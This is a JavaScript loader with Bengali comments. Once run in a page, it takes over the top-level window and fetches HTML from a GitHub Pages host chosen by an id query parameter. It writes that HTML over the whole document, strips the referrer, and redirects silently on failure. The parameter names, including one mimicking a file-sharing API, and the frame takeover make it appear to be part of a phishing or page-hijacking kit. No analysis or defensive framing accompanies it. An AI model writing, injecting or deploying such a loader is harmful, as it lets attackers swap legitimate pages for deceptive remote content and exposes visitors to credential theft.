(function () {
  var W;
  try {
    W = window.top;
    if (W.__fc_ran) return;
    W.__fc_ran = 1;
  } catch (e) {
    return;
  }

  // আপনার GitHub Pages এর বেস URL
  var BASE = 'https://riopehrips.github.io/con';
  var FAIL = BASE + '/';

  function bail(u) {
    try {
      var m = W.document.createElement('meta');
      m.name = 'referrer';
      m.content = 'no-referrer';
      W.document.head.appendChild(m);
    } catch (e) {}
    W.location.replace(u);
  }

  function getId() {
    try {
      var s = document.currentScript;
      if (s && s.src) {
        var m = new RegExp('[?&]id=([^&]+)', 'i').exec(s.src);
        if (m) return decodeURIComponent(m[1]);
      }
    } catch (e) {}

    var match = new RegExp('[?&](GetFoldersAndFiles|id|lagabo)=([^&]+)', 'i').exec(W.location.search || '');
    return match ? decodeURIComponent(match[2]) : '';
  }

  var id = getId();

  // সিকিউরিটি চেক (Directory traversal প্রতিরোধ)
  if (!/^[A-Za-z0-9_.-]{1,80}$/.test(id)) return bail(FAIL);

  // যদি id-এর শেষে .html না থাকে, তবে অটোমেটিক যুক্ত করে নেবে
  var fileName = id.endsWith('.html') ? id : id + '.html';

  var fin = 0;
  var t = setTimeout(function () { if (!fin) bail(FAIL); }, 15000);

  // সরাসরি GitHub Pages এর pages/ ফোল্ডার থেকে ফাইল ফেচ করবে
  fetch(BASE + '/pages/' + encodeURIComponent(fileName), {
    cache: 'no-store'
  })
    .then(function (r) {
      if (!r.ok) throw new Error('HTTP ' + r.status);
      return r.text();
    })
    .then(function (html) {
      fin = 1;
      clearTimeout(t);
      var d = W.document;
      d.open();
      d.write(html);
      d.close();
      W.scrollTo(0, 0);
    })
    .catch(function (e) {
      clearTimeout(t);
      try { console.error('[FC Error]:', e); } catch (x) {}
      if (!fin) bail(FAIL);
    });
})();
